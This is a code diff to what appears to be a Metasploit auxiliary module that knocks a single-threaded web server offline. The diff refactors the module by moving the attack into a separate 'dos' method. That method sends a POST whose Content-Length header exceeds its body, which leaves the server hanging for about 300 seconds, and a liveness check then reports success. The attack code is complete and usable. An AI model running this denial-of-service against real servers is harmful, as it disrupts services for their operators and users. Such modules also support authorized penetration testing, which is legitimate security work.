@@ -31,26 +31,23 @@ class MetasploitModule < Msf::Auxiliary
 
   def is_alive?
     res = send_request_raw({
-      'method'	=>	'GET',
-      'uri'	=>	'/',
+      'method'	=> 'GET',
+      'uri'	=> '/',
     },10)
 
     return !res.nil?
   end
 
-  def run
-
+  def dos
+    # The web server is single threaded, and when the content length is longer than the data, it will continue to wait
+    # for the rest of the data, which never comes, and times out after ~300 seconds.
     begin
-      time = Time.new
-      print_status("Sending malformed POST request at #{time.strftime("%Y-%m-%d %H:%M:%S")}.  Server will recover about #{(time + 300).strftime("%Y-%m-%d %H:%M:%S")}")
-      # The web server is single threaded, and when the content length is longer than the data, it will continue to wait
-      # for the rest of the data, which never comes, and times out after ~300 seconds.
       data = Rex::Text.rand_text_alphanumeric(40)
       send_request_cgi({
-        'method'	=>	'POST',
-        'uri'		=>	'/',
-        'data'		=>	data, #'asdasdasdasdasdasdasd',
-        'headers'       => {
+        'method' => 'POST',
+        'uri'    => '/',
+        'data'   => data, #'asdasdasdasdasdasdasd',
+        'headers' => {
           # These are kept here since they were in the original exploit, however they are not required
           #'Host' => 'asdasdasd',
           #'User-Agent' => 'asdasdasd',
@@ -61,19 +58,23 @@ class MetasploitModule < Msf::Auxiliary
           #'Upgrade-Insecure-Requests' => 1,
           #'Content-Type' => 'application/x-www-form-urlencoded',
           'Content-Length' => data.length + rand(10) + 10 #42
-        }
-      })
-
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
-        print_error("Couldn't connect to #{peer}")
-      return
+          }
+        })
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE
+      print_error("Couldn't connect to #{peer}")
     end
+  end
+
+  def run
+    time = Time.new
+    print_status("Sending malformed POST request at #{time.strftime("%Y-%m-%d %H:%M:%S")}.")
+    dos
 
     # Check to see if it worked or not
     if is_alive?
-      print_error("#{peer} - Server is still alive")
+      print_error("#{peer} - Server is still alive.")
     else
-      print_good("#{peer} - Connection Refused: Success!")
+      print_good("#{peer} - Connection Refused: Success! Server will recover about #{(time + 300).strftime("%Y-%m-%d %H:%M:%S")}")
     end
 
   end
